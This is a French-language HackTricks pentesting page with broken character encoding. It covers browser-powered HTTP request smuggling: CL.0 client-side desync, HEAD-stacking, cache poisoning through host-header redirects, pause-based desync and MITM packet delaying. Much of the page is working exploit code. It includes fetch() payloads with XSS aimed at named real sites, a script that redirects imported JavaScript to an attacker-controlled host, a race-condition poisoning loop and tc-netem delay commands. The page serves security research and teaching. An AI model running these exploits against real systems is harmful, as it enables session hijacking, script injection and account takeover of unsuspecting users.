# Smuggling de requÃªte HTTP du navigateur

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## CL.0/H2.0 dÃ©synchronisation compatible avec le navigateur

Cette vulnÃ©rabilitÃ© se produit lorsque l'en-tÃªte **Content Length** (CL) est complÃ¨tement **ignorÃ©** par le **serveur backend**. Ensuite, le backend traite le **corps** comme le **dÃ©but de la mÃ©thode de la deuxiÃ¨me requÃªte**. Ignorer le CL revient Ã  le traiter comme ayant une valeur de 0, il s'agit donc d'une dÃ©synchronisation CL.0 - une classe d'attaque [connue](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) mais moins explorÃ©e.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

L'attaque Ã©tait possible parce que le serveur backend **n'attendait tout simplement pas une requÃªte POST**.

{% hint style="warning" %}
Notez que cette vulnÃ©rabilitÃ© est **dÃ©clenchÃ©e** par une **requÃªte HTTP** tout Ã  fait **valide** et conforme Ã  la spÃ©cification. Cela signifie que le **front-end n'a aucune chance de se protÃ©ger** contre elle, et elle pourrait mÃªme Ãªtre dÃ©clenchÃ©e par un navigateur.
{% endhint %}

La seule **diffÃ©rence** entre **CL.0** et **H2.0** est que la deuxiÃ¨me utilise **HTTP2** (qui a un en-tÃªte de longueur implicite) mais que le **backend ne l'utilise pas non plus**.

## DÃ©synchronisation cÃ´tÃ© client

Les attaques de dÃ©synchronisation traditionnelles **empoisonnent** la **connexion** entre un **front-end et un serveur back-end**, et sont donc impossibles sur les sites Web qui n'utilisent pas une architecture front-end/back-end. Ce sont des dÃ©synchronisations cÃ´tÃ© serveur Ã  partir de maintenant. La plupart des dÃ©synchronisations cÃ´tÃ© serveur ne peuvent Ãªtre dÃ©clenchÃ©es que par un **client HTTP personnalisÃ© Ã©mettant une requÃªte malformÃ©e**.

La capacitÃ© d'un **navigateur Ã  causer une dÃ©synchronisation** permet une toute nouvelle classe de menace appelÃ©e **dÃ©synchronisation cÃ´tÃ© client** (CSD).\
Une attaque CSD commence par la **visite de la victime sur le site Web de l'attaquant**, qui fait ensuite envoyer Ã  leur navigateur **deux requÃªtes inter-domaines vers le site vulnÃ©rable**. La **premiÃ¨re** requÃªte est conÃ§ue pour **dÃ©synchroniser la connexion du navigateur** et faire en sorte que la **deuxiÃ¨me requÃªte dÃ©clenche** une rÃ©ponse nuisible, donnant gÃ©nÃ©ralement Ã  l'attaquant le contrÃ´le du compte de la victime.

### DÃ©tecter

Un vecteur CSD est une requÃªte HTTP avec **deux** propriÃ©tÃ©s **clÃ©s**.

PremiÃ¨rement, le **serveur doit ignorer le Content-Length (CL) de la requÃªte**. Cela se produit gÃ©nÃ©ralement parce que la requÃªte a dÃ©clenchÃ© une **erreur du serveur**, ou que le serveur n'attendait tout simplement pas une requÃªte POST Ã  l'endpoint choisi. Essayez de cibler les **fichiers statiques** et les **redirections au niveau du serveur**, et de dÃ©clencher des erreurs via des **URL trop longues**, et des **URL semi-malformÃ©es** comme /%2e%2e.

DeuxiÃ¨mement, la requÃªte doit Ãªtre **dÃ©clenchable dans un navigateur Web inter-domaines**. Les navigateurs restreignent considÃ©rablement le contrÃ´le sur les requÃªtes inter-domaines, vous avez donc un contrÃ´le limitÃ© sur les en-tÃªtes, et si votre requÃªte a un corps, vous devrez utiliser la mÃ©thode HTTP POST. En fin de compte, vous ne **contrÃ´lez** que l'**URL**, plus quelques Ã©lÃ©ments comme l'en-tÃªte **Referer**, le corps et la **derniÃ¨re partie du Content-Type.**

#### Test d'ignorance de CL

La faÃ§on de tester cette configuration incorrecte est d'**envoyer 2 requÃªtes et de faire passer une** dans le **milieu**. Si la connexion **dÃ©viÃ©e** a **affectÃ©** la rÃ©ponse de la **deuxiÃ¨me requÃªte**, cela signifie qu'elle est **vulnÃ©rable** :

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Notez que vous ne pouvez pas tester cette vulnÃ©rabilitÃ© en envoyant simplement un **Content-Length plus grand** que celui envoyÃ© et en **cherchant un dÃ©lai d'attente** car certains serveurs rÃ©pondent mÃªme s'ils n'ont pas reÃ§u tout le corps.
{% endhint %}

Il est important de noter si le site Web cible prend en charge HTTP/2. Les attaques CSD exploitent gÃ©nÃ©ralement la rÃ©utilisation de connexion HTTP/1.1 et les navigateurs Web **prÃ©fÃ¨rent utiliser HTTP/2** chaque fois que possible, donc si le site cible prend en charge HTTP/2, vos attaques sont peu susceptibles de fonctionner. Il y a une **exception** ; certains **proxys avant ne prennent pas en charge HTTP/2** donc vous pouvez exploiter quiconque les utilise. Cela inclut les proxys d'entreprise, certains VPN intrusifs et mÃªme certains outils de sÃ©curitÃ©.

### Confirmer

Tout d'abord, sÃ©lectionnez un site pour lancer l'attaque. Ce site doit Ãªtre **accessible via HTTPS** et situÃ© sur un **domaine diffÃ©rent de la cible**.

Ensuite, assurez-vous que vous **n'avez pas de proxy configurÃ©**, puis accÃ©dez Ã  votre site d'attaque. Ouvrez les **outils de dÃ©veloppement** et passez Ã  l'onglet **RÃ©seau**. Pour aider Ã  dÃ©boguer les problÃ¨mes potentiels plus tard, je recommande de faire les ajustements suivants :

* SÃ©lectionnez la case Ã  cocher **"Conserver le journal"**.
* Cliquez avec le bouton droit de la souris sur les en-tÃªtes de colonne et **activez la colonne "ID de connexion"**.

Passez Ã  la console de dÃ©veloppement et exÃ©cutez JavaScript pour reproduire votre sÃ©quence d'attaque en utilisant fetch(). Cela peut ressembler Ã  quelque chose comme :
```javascript
fetch('https://example.com/', {
  method: 'POST',
     body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
     mode: 'no-cors', // ensure connection ID is visible
     credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
     location = 'https://example.com/' // use the poisoned connection
})
```
J'ai dÃ©fini le mode de rÃ©cupÃ©ration **'no-cors'** pour m'assurer que Chrome **affiche l'ID de connexion** dans l'onglet RÃ©seau. J'ai Ã©galement dÃ©fini **credentials: 'include'** car Chrome a [**deux pools de connexions distincts**](https://www.chromium.org/developers/design-documents/network-stack/preconnect) - un pour les requÃªtes avec des cookies et un pour les requÃªtes sans. Vous voudrez gÃ©nÃ©ralement exploiter les **navigations**, et celles-ci **utilisent le pool 'with-cookies'**, il est donc utile de prendre l'habitude de toujours empoisonner ce pool.

Lorsque vous exÃ©cutez cela, vous devriez voir **deux requÃªtes** dans l'onglet RÃ©seau avec le **mÃªme ID de connexion**, et la **deuxiÃ¨me** devrait dÃ©clencher un **404** :

![](<../../.gitbook/assets/image (158) (2).png>)

Si cela fonctionne comme prÃ©vu, fÃ©licitations - vous avez trouvÃ© une dÃ©synchronisation cÃ´tÃ© client !

### Exploitation - Stockage

Une option consiste Ã  identifier une fonctionnalitÃ© sur le site cible qui vous permet de **stocker des donnÃ©es textuelles**, et de crÃ©er le prÃ©fixe de sorte que les cookies, les en-tÃªtes d'authentification ou le mot de passe de votre victime finissent par Ãªtre **stockÃ©s quelque part oÃ¹ vous pouvez les rÃ©cupÃ©rer**. Ce flux d'attaque fonctionne [presque de la mÃªme maniÃ¨re que la dÃ©synchronisation cÃ´tÃ© serveur](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), donc je ne m'attarderai pas dessus.

### Exploitation - **ChaÃ®ne et pivot**

Dans des circonstances normales, de nombreuses classes d'attaques **cÃ´tÃ© serveur** ne peuvent Ãªtre lancÃ©es que par un attaquant ayant un accÃ¨s direct au site cible car elles **reposent sur des requÃªtes HTTP que les navigateurs refusent d'envoyer**, comme la **manipulation** des **en-tÃªtes HTTP** - empoisonnement du cache web, la plupart des dÃ©synchronisations cÃ´tÃ© serveur, les attaques d'en-tÃªte d'hÃ´te, les injections SQL basÃ©es sur User-Agent, CSRF JSON Content-type et de nombreuses autres.

Le chemin le plus simple vers une attaque rÃ©ussie est venu de deux techniques clÃ©s gÃ©nÃ©ralement utilisÃ©es pour les attaques de dÃ©synchronisation cÃ´tÃ© serveur : [**empoisonnement des ressources JavaScript via des redirections d'en-tÃªte d'hÃ´te**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), et l'utilisation de la [**mÃ©thode HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) pour assembler une rÃ©ponse avec un HTML malveillant. Les deux techniques ont dÃ» Ãªtre **adaptÃ©es** pour surmonter certains dÃ©fis novateurs associÃ©s Ã  l'exploitation dans le **navigateur de la victime**.

## Exemples d'exploits

### Exemple de HEAD empilÃ©

* **Exploit colorÃ©**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Exploit JS**
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    // use a cache-buster to delay the response
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})va
```
Explication :

* **Abus de CL.0** dans /assets (il redirige vers /assets/ et ne vÃ©rifie pas le CL)
* **Contrebande** d'une requÃªte **HEAD** (parce que les rÃ©ponses HEAD contiennent toujours une longueur de contenu)
* **Contrebande** d'une requÃªte **GET** dont le **contenu** va Ãªtre **rÃ©flÃ©chi** dans la rÃ©ponse avec la charge utile.
  * En raison de la **longueur de contenu de la requÃªte HEAD**, la **rÃ©ponse** de cette requÃªte sera le **corps de la requÃªte HEAD**
* DÃ©finir le mode **cors**. Normalement, cela n'est pas fait, mais dans ce cas, la **rÃ©ponse** du serveur Ã  la **POST** **initiale** est une **redirection** qui, si elle est **suivie**, l'**exploit ne fonctionnera pas**. Par consÃ©quent, le mode **cors** est utilisÃ© pour **dÃ©clencher** une **erreur** et **rediriger** la victime avec le **`catch`**.

### **Redirection d'en-tÃªte d'hÃ´te + empoisonnement du cache cÃ´tÃ© client**

* **Exploit JS**
```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Une requÃªte vers `/+webvpn+/` avec un **domaine diffÃ©rent dans l'en-tÃªte Host** est rÃ©pondue avec une **redirection** vers `/+webvpn+/index.html` vers ce **domaine** dans l'en-tÃªte Host.
* L'emplacement dans la **deuxiÃ¨me** requÃªte est dÃ©fini sur `/+CSCOE+/win.js` afin de **empoisonner** le **cache** de ce fichier `.js`.
  * Cette requÃªte sera rÃ©pondue avec la redirection de `/+webvpn+/` vers le domaine de l'attaquant avec le chemin `/+webvpn+/index.html`
* Le **cache** de **`win.js`** sera **empoisonnÃ©** avec une **redirection** vers la page de l'**attaquant**, mais aussi la **victime** suivra la redirection car elle a Ã©tÃ© assignÃ©e Ã  la variable `location` et finira sur la page web de l'attaquant.
* L'attaquant **redirigera** ensuite la **victime** vers `https://redacted/+CSCOE+/logon.html`. Cette page importera `/+CSCOE+/win.js`. Dont le **cache est une redirection** vers le serveur de l'**attaquant**, par consÃ©quent, l'attaquant peut **rÃ©pondre avec un code JS malveillant**.

La **victime** accÃ©dera Ã  la page de l'**attaquant** **deux fois**, la premiÃ¨re fois elle **s'attend Ã  un HTML** qui redirige la victime vers `https://redacted/+CSCOE+/logon.html` et la deuxiÃ¨me fois elle **s'attend Ã  un code javascript** (la charge utile). Un polyglotte peut Ãªtre utilisÃ© pour servir les deux rÃ©ponses en une seule :
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Payload HEAD avec TE chunked

Lors de la recherche de CSD, vous pouvez Ã©galement **tester des URL semi-malformÃ©es** telles que `/..%2f` ou `/%2f`.

* **Exploit en couleur**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Exploit JS**
```javascript
fetch('https://www.verisign.com/%2f', { 
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`, 
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
    let form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://www.verisign.com/robots.txt'
    form.enctype = 'text/plain'
    let input = document.createElement('input')
    input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
    input.value = ''
    form.appendChild(input)
    document.body.appendChild(form)
    form.submit()
}
```
* La page **`/%2f`** est accÃ©dÃ©e pour **exploiter** la vulnÃ©rabilitÃ© **CL.0**.
* Une requÃªte **HEAD** est contrebandÃ©e en utilisant l'en-tÃªte **`Transfer-Encoding: chunked`**.
  * Cet en-tÃªte est nÃ©cessaire dans ce scÃ©nario car sinon le **serveur refuse d'accepter une requÃªte HEAD avec un corps**.
* Ensuite, l'utilisateur envoie un POST dont le corps contient le **chunk final de la prÃ©cÃ©dente requÃªte HEAD** et une **nouvelle requÃªte qui est contrebandÃ©e** avec du **contenu** (la charge utile JS) qui sera **rÃ©flÃ©chie** dans la rÃ©ponse.
  * Par consÃ©quent, le navigateur traitera la **rÃ©ponse Ã  la requÃªte HEAD** comme la **rÃ©ponse Ã  la requÃªte POST** qui contiendra Ã©galement dans le **corps** de la rÃ©ponse qui **reflÃ¨te** l'**entrÃ©e** de l'utilisateur dans la deuxiÃ¨me requÃªte contrebandÃ©e.

### Redirection d'en-tÃªte d'hÃ´te + RC

* **Exploit JS**
```html
<script>
    function reset() {
        fetch('https://vpn.redacted/robots.txt', 
            {mode: 'no-cors', credentials: 'include'}
        ).then(() => {
            x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
        })
        setTimeout(poison, 120) // worked on 140. went down to 110
    }

    function poison(){
        sendPoison()
        sendPoison()
        sendPoison()
        setTimeout(reset, 1000)
    }

    function sendPoison(){
        fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css', 
            {
                method: 'POST',
                body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
                mode: 'no-cors', 
                credentials: 'include'
            }
        )
    }

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
Dans ce cas, encore une fois, il y a une **redirection d'en-tÃªte d'hÃ´te** qui pourrait Ãªtre utilisÃ©e pour **pirater** une importation **JS**. Cependant, cette fois, la **redirection n'est pas mise en cache**, donc l'empoisonnement du **cache cÃ´tÃ© client** n'est pas une option.

Par consÃ©quent, l'attaque effectuÃ©e fera que la **victime accÃ¨de Ã  la page vulnÃ©rable** dans un onglet et puis, juste **avant** que la page essaie de **charger un fichier JS**, **empoisonner** les connexions **d'acheminement de socket** (3 dans ce cas).\
Comme la **chronologie** doit Ãªtre extrÃªmement **prÃ©cise**, l'attaque est effectuÃ©e contre un **nouvel onglet Ã  chaque itÃ©ration** jusqu'Ã  ce que cela fonctionne.

{% hint style="warning" %}
Gardez Ã  l'esprit que dans ce cas, `/meeting_testjs.cgi` a Ã©tÃ© attaquÃ© car il **charge** un **Javascript** qui rÃ©pond avec un **404**, donc il n'est pas mis en cache. Dans d'autres scÃ©narios oÃ¹ vous essayez d'attaquer un **JS qui est mis en cache**, vous devez attendre qu'il **disparaisse du cache** avant de lancer une nouvelle attaque.
{% endhint %}

Ã‰tapes rÃ©sumÃ©es :

* Ouvrir une nouvelle fenÃªtre.
* Ã‰mettre une demande inoffensive Ã  la cible pour Ã©tablir une nouvelle connexion, rendant les chronomÃ©trages plus cohÃ©rents.
* Naviguer dans la fenÃªtre vers la page cible Ã  /meeting\_testjs.cgi.
* 120ms plus tard, crÃ©er trois connexions empoisonnÃ©es en utilisant le gadget de redirection.
* 5ms plus tard, pendant le rendu de /meeting\_testjs.cgi, la victime tentera avec un peu de chance d'importer /appletRedirect.js et sera redirigÃ©e vers x.psres.net, qui sert un JS malveillant.
* Si ce n'est pas le cas, rÃ©essayer l'attaque.

## DÃ©synchronisation basÃ©e sur la pause <a href="#pause" id="pause"></a>

La pause peut Ã©galement crÃ©er de nouvelles vulnÃ©rabilitÃ©s de dÃ©synchronisation en **dÃ©clenchant des implÃ©mentations de dÃ©lai d'attente de demande mal guidÃ©es**.

Ainsi, un attaquant pourrait envoyer une demande avec des **en-tÃªtes indiquant qu'il y a un corps**, puis **attendre** que le **front-end expire avant d'envoyer le corps**. Si le front-end expire mais **laisse la connexion ouverte**, le **corps** de cette demande sera **traitÃ© comme une nouvelle demande**.

### Exemple : **Varnish**

La cache Varnish dispose d'une fonctionnalitÃ© appelÃ©e `synth()`, qui vous permet d'Ã©mettre une **rÃ©ponse sans transfÃ©rer** la demande Ã  l'arriÃ¨re-plan. Voici une rÃ¨gle d'exemple utilisÃ©e pour bloquer l'accÃ¨s Ã  un dossier :
```javascript
if (req.url ~ "^/admin") {
    return (synth(403, "Forbidden"));
}
```
Lors du traitement d'une **requÃªte partielle** qui correspond Ã  une rÃ¨gle synthÃ©tique, Varnish **expire** s'il ne reÃ§oit aucune donnÃ©e pendant **15 secondes**. Lorsque cela se produit, il **laisse la connexion ouverte** pour une rÃ©utilisation mÃªme s'il n'a lu que la moitiÃ© de la requÃªte sur la socket. Cela signifie que si le **client envoie la deuxiÃ¨me moitiÃ©** de la requÃªte HTTP, elle sera interprÃ©tÃ©e comme une **nouvelle requÃªte**.

Pour dÃ©clencher une dÃ©synchronisation basÃ©e sur une pause sur un front-end vulnÃ©rable, commencez par envoyer vos en-tÃªtes, en promettant un corps, puis attendez simplement. Finalement, vous recevrez une rÃ©ponse et lorsque vous enverrez enfin votre corps de requÃªte, il sera interprÃ©tÃ© comme une nouvelle requÃªte :

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Apparemment, cela a Ã©tÃ© corrigÃ© le 25 janvier en tant que [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Exemple : **Apache**

Tout comme Varnish, il est vulnÃ©rable sur les **points d'extrÃ©mitÃ© oÃ¹ le serveur gÃ©nÃ¨re la rÃ©ponse lui-mÃªme** plutÃ´t que de laisser l'application gÃ©rer la requÃªte. Cela se produit notamment avec les redirections au niveau du serveur : `Redirect 301 / /en`

### Exploitation cÃ´tÃ© serveur <a href="#server" id="server"></a>

Si le serveur vulnÃ©rable (Apache ou Varnish dans ce cas) est Ã  l'arriÃ¨re-plan, un **front-end** qui **transmet la requÃªte au serveur d'arriÃ¨re-plan** (les en-tÃªtes HTTP dans ce cas) **sans mettre en tampon** l'ensemble du corps de la requÃªte est nÃ©cessaire.

![](<../../.gitbook/assets/image (3) (3).png>)

Dans ce cas, l'attaquant **ne recevra pas l'expiration de la rÃ©ponse tant qu'il n'aura pas envoyÃ© le corps**. Mais s'il connaÃ®t le dÃ©lai d'expiration, cela ne devrait pas poser de problÃ¨me.

Le rÃ©partiteur de charge d'applications (ALB) d'Amazon **diffuse les donnÃ©es de la connexion au besoin**, mais s'il **reÃ§oit** la **rÃ©ponse** Ã  la **moitiÃ© de la requÃªte** (le dÃ©lai d'expiration) **avant** de recevoir le **corps**, il **n'enverra pas le corps**, donc une **condition de course** doit Ãªtre exploitÃ©e ici :

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Il y a une complication supplÃ©mentaire lorsqu'il s'agit d'**exploiter Apache derriÃ¨re ALB** - **les deux serveurs** ont un **dÃ©lai d'expiration par dÃ©faut de 60 secondes**. Cela laisse une **fenÃªtre de temps extrÃªmement courte** pour envoyer la deuxiÃ¨me partie de la requÃªte. L'attaque RC a finalement rÃ©ussi aprÃ¨s 66 heures.

### Exploitation MITM

Il est apparemment **impossible d'arrÃªter une requÃªte du navigateur** afin d'exploiter une vulnÃ©rabilitÃ© de dÃ©synchronisation de pause. Cependant, vous pouvez toujours **effectuer une attaque MITM pour mettre en pause une requÃªte** envoyÃ©e par le navigateur. Notez que cette attaque **ne repose pas sur le dÃ©cryptage** du trafic.

Le flux d'attaque est trÃ¨s **similaire Ã  une attaque de dÃ©synchronisation cÃ´tÃ© client rÃ©guliÃ¨re**. L'utilisateur visite une page contrÃ´lÃ©e par l'attaquant, qui Ã©met une sÃ©rie de **requÃªtes inter-domaines** vers l'application cible. La **premiÃ¨re requÃªte HTTP** est dÃ©libÃ©rÃ©ment rembourrÃ©e pour Ãªtre si **grande** que le systÃ¨me d'exploitation **la divise en plusieurs paquets TCP**, permettant Ã  un MITM actif de retarder le dernier paquet, dÃ©clenchant une dÃ©synchronisation basÃ©e sur une pause. En raison du rembourrage, l'**attaquant** peut **identifier** quel **paquet mettre en pause** simplement en fonction de la **taille**.

Du cÃ´tÃ© client, cela ressemble Ã  une dÃ©synchronisation cÃ´tÃ© client rÃ©guliÃ¨re utilisant le gadget HEAD, Ã  l'exception du rembourrage de la requÃªte :
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
Sur le systÃ¨me de l'attaquant effectuant le MITM aveugle, le dÃ©lai a Ã©tÃ© mis en Å“uvre en utilisant tc-NetEm :
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **RÃ©fÃ©rences**

* Toutes les informations de cet article ont Ã©tÃ© prises sur [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
